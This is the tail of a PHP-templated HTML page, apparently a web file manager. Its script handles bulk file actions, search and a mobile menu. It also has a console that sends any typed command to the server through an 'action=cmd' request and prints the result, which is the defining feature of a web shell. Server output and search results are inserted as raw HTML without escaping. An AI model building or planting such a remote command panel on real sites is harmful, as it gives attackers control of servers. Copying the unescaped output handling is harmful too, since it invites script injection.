            const cmdInput = document.getElementById('cmd-input');
            const cmdOutput = document.getElementById('cmd-output');
            const cmdExecute = document.getElementById('cmd-execute');
            if (cmdExecute) {
                const executeCmd = function() {
                    const command = cmdInput.value;
                    if (!command) return;
                    cmdOutput.innerHTML += '<div class="text-yellow-400">> ' + command + '</div>';
                    cmdInput.value = '';
                    fetch('?action=cmd&command=' + encodeURIComponent(command) +
                            '&p=<?= $current_path_encoded ?>')
                        .then(function(response) {
                            return response.json();
                        })
                        .then(function(result) {
                            const outputText = result.data.replace(/\\n/g, '<br>');
                            cmdOutput.innerHTML += '<div>' + outputText + '</div>';
                            cmdOutput.scrollTop = cmdOutput.scrollHeight;
                        })
                        .catch(function(e) {
                            cmdOutput.innerHTML += '<div class="text-red-500">Request failed.</div>';
                            cmdOutput.scrollTop = cmdOutput.scrollHeight;
                        });
                };
                cmdExecute.addEventListener('click', executeCmd);
                cmdInput.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') executeCmd();
                });
            }

            // --- Flash Message ---
            const flash = document.getElementById('flash-message');
            if (flash) setTimeout(function() {
                flash.style.display = 'none';
            }, 4000);

            // --- Bulk Actions ---
            const selectAllCheckbox = document.getElementById('select-all-checkbox');
            const itemCheckboxes = document.querySelectorAll('.item-checkbox');
            const bulkForm = document.getElementById('bulk-action-form');
            if (bulkForm) {
                const bulkOperationInput = document.getElementById('bulk-operation');
                const destinationFolderInput = document.getElementById('destination-folder-input');

                if (selectAllCheckbox) {
                    selectAllCheckbox.addEventListener('change', function(e) {
                        itemCheckboxes.forEach(function(cb) {
                            cb.checked = e.target.checked;
                        });
                    });
                }

                const getSelectedItems = function() {
                    var selected = [];
                    itemCheckboxes.forEach(function(cb) {
                        if (cb.checked) {
                            selected.push(cb);
                        }
                    });
                    return selected;
                };

                document.getElementById('bulk-apply-btn').addEventListener('click', function() {
                    const selectedAction = document.getElementById('bulk-action-select').value;
                    if (getSelectedItems().length === 0) {
                        alert('Please select at least one item.');
                        return;
                    }
                    if (!selectedAction) {
                        alert('Please choose an action from the dropdown.');
                        return;
                    }
                    bulkOperationInput.value = selectedAction;
                    if (selectedAction === 'copy' || selectedAction === 'move') {
                        const title = selectedAction.charAt(0).toUpperCase() + selectedAction.slice(1);
                        document.getElementById('bulk-modal-title').innerText = title + ' Selected Items';
                        showModal('bulk-move');
                    } else if (selectedAction === 'delete') {
                        if (confirm(
                                'Are you sure you want to delete the selected items? This cannot be undone.'
                            )) {
                            bulkForm.submit();
                        }
                    } else if (selectedAction === 'zip') {
                        if (confirm('Create a zip archive from the selected items?')) {
                            bulkForm.submit();
                        }
                    }
                });

                document.getElementById('confirm-bulk-action').addEventListener('click', function() {
                    const destination = document.getElementById('destination_folder').value;
                    if (!destination) {
                        alert('Please enter a destination folder path.');
                        return;
                    }
                    destinationFolderInput.value = destination;
                    bulkForm.submit();
                });
            }

            // --- HAMBURGER MENU SCRIPT (WITH ANIMATION) --- //
            const hamburgerButton = document.getElementById('hamburger-menu-button');
            const mobileMenu = document.getElementById('mobile-menu');

            function toggleMenu() {
                const isHidden = mobileMenu.classList.contains('hidden');
                if (isHidden) {
                    mobileMenu.classList.remove('hidden');
                    setTimeout(function() {
                        mobileMenu.classList.remove('opacity-0', 'scale-95');
                        mobileMenu.classList.add('opacity-100', 'scale-100');
                    }, 10);
                } else {
                    mobileMenu.classList.remove('opacity-100', 'scale-100');
                    mobileMenu.classList.add('opacity-0', 'scale-95');
                    setTimeout(function() {
                        mobileMenu.classList.add('hidden');
                    }, 200); // Duration must match the transition duration in HTML
                }
            }

            if (hamburgerButton && mobileMenu) {
                hamburgerButton.addEventListener('click', function(event) {
                    event.stopPropagation();
                    toggleMenu();
                });
            }

            document.addEventListener('click', function(event) {
                const isVisible = !mobileMenu.classList.contains('hidden');
                if (isVisible && !mobileMenu.contains(event.target) && !hamburgerButton.contains(event
                        .target)) {
                    toggleMenu();
                }
            });

            window.showModalAndCloseMenu = function(modalId) {
                showModal(modalId);
                const isVisible = !mobileMenu.classList.contains('hidden');
                if (isVisible) {
                    toggleMenu();
                }
            };

            // --- NEW SCRIPT: Search Feature --- //
            const executeSearchBtn = document.getElementById('execute-search-btn');
            const searchQueryInput = document.getElementById('search-query-input');
            const searchResultsContainer = document.getElementById('search-results-container');

            const performSearch = function() {
                const query = searchQueryInput.value;
                if (!query) {
                    searchResultsContainer.innerHTML =
                        '<p class="text-yellow-400">Please enter a search query.</p>';
                    return;
                }

                searchResultsContainer.innerHTML = '<p class="text-gray-400">Searching...</p>';
                const currentPath = '<?= $current_path_encoded ?>';

                fetch('?action=search&query=' + encodeURIComponent(query) + '&p=' + currentPath)
                    .then(function(response) {
                        return response.json();
                    })
                    .then(function(result) {
                        if (result.status === 'success' && result.data.length > 0) {
                            searchResultsContainer.innerHTML = ''; // Clear previous results
                            result.data.forEach(function(item) {
                                const iconClass = item.is_dir ? 'fas fa-folder text-blue-400' :
                                    'fas fa-file-alt text-gray-300';
                                const link = document.createElement('a');
                                link.href = '?p=' + item.parent_dir_encoded;
                                link.className =
                                    'flex items-center gap-2 p-2 hover:bg-gray-800 rounded-md break-all';
                                link.innerHTML = '<i class="' + iconClass +
                                    ' w-5 text-center"></i><span>' + item.path + '</span>';
                                searchResultsContainer.appendChild(link);
                            });
                        } else {
                            searchResultsContainer.innerHTML =
                                '<p class="text-gray-500">No results found.</p>';
                        }
                    })
                    .catch(function(e) {
                        searchResultsContainer.innerHTML =
                            '<p class="text-red-500">An error occurred during search.</p>';
                    });
            };

            if (executeSearchBtn) {
                executeSearchBtn.addEventListener('click', performSearch);
                searchQueryInput.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        performSearch();
                    }
                });
            }

        });
    </script>
</body>

</html>
